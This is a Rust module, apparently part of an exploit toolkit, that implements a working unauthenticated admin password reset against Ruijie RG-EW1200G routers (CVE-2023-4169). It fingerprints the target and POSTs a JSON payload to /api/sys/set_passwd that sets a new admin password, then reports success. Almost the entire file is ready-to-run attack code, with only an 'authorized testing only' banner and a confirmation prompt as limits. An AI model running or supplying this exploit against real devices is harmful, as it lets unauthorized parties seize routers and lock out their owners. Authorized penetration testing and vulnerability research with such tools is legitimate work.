//! Ruijie RG-EW1200G Password Reset (CVE-2023-4169)
//!
//! **Vulnerability**: Unauthenticated admin password reset
//! **Affected**: RG-EW1200G routers
//! **CVSS**: 9.8 (Critical)
//! **Requirements**: Network access to device web interface
//!
//! ## Attack:
//! Reset admin password without authentication via /api/sys/set_passwd endpoint
//!
//! FOR AUTHORIZED SECURITY TESTING ONLY

use anyhow::{anyhow, Context, Result};
use colored::Colorize;
use reqwest::Client;
use std::io::Write;
use std::time::Duration;

use crate::utils::prompt_yes_no;

// ============================================================================
// CONSTANTS
// ============================================================================

const DEFAULT_TIMEOUT_SECS: u64 = 10;
const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) RuijieExploit/1.0";

// ============================================================================
// CONFIGURATION
// ============================================================================

struct ExploitConfig {
    target_url: String,
    new_password: String,
    timeout_secs: u64,
    verify_ssl: bool,
}

impl ExploitConfig {
    fn get_passwd_endpoint(&self) -> String {
        format!("{}/api/sys/set_passwd", self.target_url)
    }
    
    fn get_timeout(&self) -> Duration {
        Duration::from_secs(self.timeout_secs)
    }
}

// ============================================================================
// HTTP CLIENT
// ============================================================================

fn build_client(config: &ExploitConfig) -> Result<Client> {
    Client::builder()
        .danger_accept_invalid_certs(!config.verify_ssl)
        .timeout(config.get_timeout())
        .user_agent(USER_AGENT)
        .build()
        .context("Failed to build HTTP client")
}

// ============================================================================
// EXPLOIT LOGIC
// ============================================================================

async fn execute_password_reset(client: &Client, config: &ExploitConfig) -> Result<()> {
    let passwd_url = config.get_passwd_endpoint();
    
    println!("{}", format!("[*] Target URL: {}", config.target_url).cyan());
    println!("{}", format!("[*] Timeout: {}s", config.timeout_secs).cyan());
    println!("{}", format!("[*] SSL Verify: {}", if config.verify_ssl { "yes" } else { "no" }).cyan());
    println!("{}", format!("[*] New Password: {}", config.new_password).cyan());
    println!("{}", format!("[*] Sending reset request to {}...", passwd_url).blue());
    
    // Password reset payload
    let payload = serde_json::json!({
        "username": "web",
        "admin_new": config.new_password
    });
    
    let resp = client
        .post(&passwd_url)
        .json(&payload)
        .send()
        .await
        .context("Failed to send password reset request")?;
    
    let status = resp.status();
    let response_text = resp.text().await.context("Failed to read response")?;
    
    println!("{}", format!("[*] Response: HTTP {}", status).cyan());
    
    // Check for successful reset
    if response_text.contains(r#""result":"ok""#) || response_text.contains(r#""result": "ok""#) {
        println!("{}", "[+] PASSWORD RESET SUCCESSFUL!".green().bold());
        println!("{}", "[VULN] Device is VULNERABLE to CVE-2023-4169".red().bold());
        println!("{}", format!("[+] New admin password: {}", config.new_password).green().bold());
        println!("{}", "[+] You can now login with admin / <new_password>".green());
        Ok(())
    } else if status.is_success() {
        println!("{}", "[*] Request succeeded but reset not confirmed".yellow());
        println!("{}", format!("[*] Response: {}", &response_text[..response_text.len().min(300)]).dimmed());
        Err(anyhow!("Password reset not confirmed"))
    } else {
        println!("{}", format!("[-] Request failed: HTTP {}", status).red());
        println!("{}", format!("[-] Response: {}", &response_text[..response_text.len().min(200)]).red());
        Err(anyhow!("Exploit failed with HTTP {}", status))
    }
}

/// Test if target is likely a Ruijie device
async fn check_fingerprint(client: &Client, config: &ExploitConfig) -> bool {
    println!("{}", "[*] Fingerprinting target...".blue());
    
    let resp = match client.get(&config.target_url).send().await {
        Ok(r) => r,
        Err(_) => return false,
    };
    
    let headers = resp.headers().clone();
    let body = match resp.text().await {
        Ok(t) => t,
        Err(_) => return false,
    };
    
    let is_ruijie = body.to_lowercase().contains("ruijie") 
        || body.to_lowercase().contains("rg-ew")
        || body.contains("EW1200")
        || headers.get("server").map_or(false, |v| v.to_str().unwrap_or("").contains("Ruijie"));
    
    if is_ruijie {
        println!("{}", "[+] Target appears to be a Ruijie device".green());
    } else {
        println!("{}", "[*] Could not confirm Ruijie device (continuing anyway)".yellow());
    }
    
    is_ruijie
}

// ============================================================================
// MAIN ENTRY POINT
// ============================================================================

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    // Gather configuration
    let config = gather_config(target)?;
    
    // Build client
    let client = build_client(&config)?;
    
    // Fingerprint
    check_fingerprint(&client, &config).await;
    
    // Execute exploit
    match execute_password_reset(&client, &config).await {
        Ok(_) => {
            println!("\n{}", "=== Exploit Successful ===".green().bold());
            println!("{}", format!("Login with: admin / {}", config.new_password).cyan());
        }
        Err(e) => {
            println!("\n{}", format!("[-] Exploit failed: {}", e).red());
            println!("{}", "[*] Device may be patched or not vulnerable.".yellow());
        }
    }
    
    Ok(())
}

fn display_banner() {
    println!("{}", r#"
╔═══════════════════════════════════════════════════════════════╗
║   Ruijie RG-EW1200G Password Reset (CVE-2023-4169)            ║
║   Unauthenticated admin password reset                        ║
║   CVSS: 9.8 Critical | Unauthenticated                        ║
╚═══════════════════════════════════════════════════════════════╝
"#.cyan().bold());
    
    println!("{}", "[!] FOR AUTHORIZED SECURITY TESTING ONLY".yellow().bold());
    println!("{}", "[!] This will CHANGE the admin password!\n".red().bold());
}

fn gather_config(initial_target: &str) -> Result<ExploitConfig> {
    // Get target URL
    let target_url = if initial_target.starts_with("http") {
        initial_target.trim_end_matches('/').to_string()
    } else if !initial_target.is_empty() {
        format!("http://{}", initial_target.trim_end_matches('/'))
    } else {
        print!("{}", "Target IP/URL: ".green());
        std::io::stdout().flush()?;
        let mut input = String::new();
        std::io::stdin().read_line(&mut input)?;
        let input = input.trim();
        if input.is_empty() {
            return Err(anyhow!("Target is required"));
        }
        if input.starts_with("http") {
            input.trim_end_matches('/').to_string()
        } else {
            format!("http://{}", input.trim_end_matches('/'))
        }
    };
    
    // New password
    print!("{}", "New admin password: ".green());
    std::io::stdout().flush()?;
    let mut new_password = String::new();
    std::io::stdin().read_line(&mut new_password)?;
    let new_password = new_password.trim().to_string();
    
    if new_password.is_empty() {
        return Err(anyhow!("New password is required"));
    }
    
    if new_password.len() < 4 {
        println!("{}", "[!] Warning: Password is very short".yellow());
    }
    
    // Timeout configuration
    print!("{}", format!("Timeout seconds [{}]: ", DEFAULT_TIMEOUT_SECS).green());
    std::io::stdout().flush()?;
    let mut timeout_input = String::new();
    std::io::stdin().read_line(&mut timeout_input)?;
    let timeout_secs = timeout_input.trim().parse().unwrap_or(DEFAULT_TIMEOUT_SECS);
    
    // SSL verification
    let verify_ssl = !prompt_yes_no("Skip SSL verification?", true)?;
    
    let config = ExploitConfig {
        target_url,
        new_password,
        timeout_secs,
        verify_ssl,
    };
    
    // Show config summary
    println!("\n{}", "=== Configuration ===".bold());
    println!("  Target:       {}", config.target_url);
    println!("  Endpoint:     {}", config.get_passwd_endpoint());
    println!("  New Password: {}", config.new_password);
    println!("  Timeout:      {}s", config.timeout_secs);
    println!("  SSL:          {}", if config.verify_ssl { "verified" } else { "skip" });
    
    println!("\n{}", "[!] This will reset the admin password!".red().bold());
    if !prompt_yes_no("Proceed with exploit?", false)? {
        return Err(anyhow!("Cancelled by user"));
    }
    
    Ok(config)
}
